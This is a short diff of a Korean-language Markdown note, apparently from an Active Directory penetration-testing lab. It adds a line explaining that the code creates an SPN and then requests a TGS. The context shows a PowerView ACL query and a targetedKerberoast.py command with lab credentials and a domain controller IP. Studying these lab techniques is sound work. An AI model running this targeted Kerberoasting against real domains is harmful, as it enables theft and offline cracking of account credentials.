@@ -17,6 +17,7 @@ Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}
 ```
 
 ### Abusing
+- SPN을 생성한 후에 TGS를 요청하게 되는 코드가 있다.
 ```bash
 python3 targetedKerberoast.py -vv -d inlanefreight.local -u pedro -p SecuringAD01 --request-user rita --dc-ip 10.129.205.81
 ```
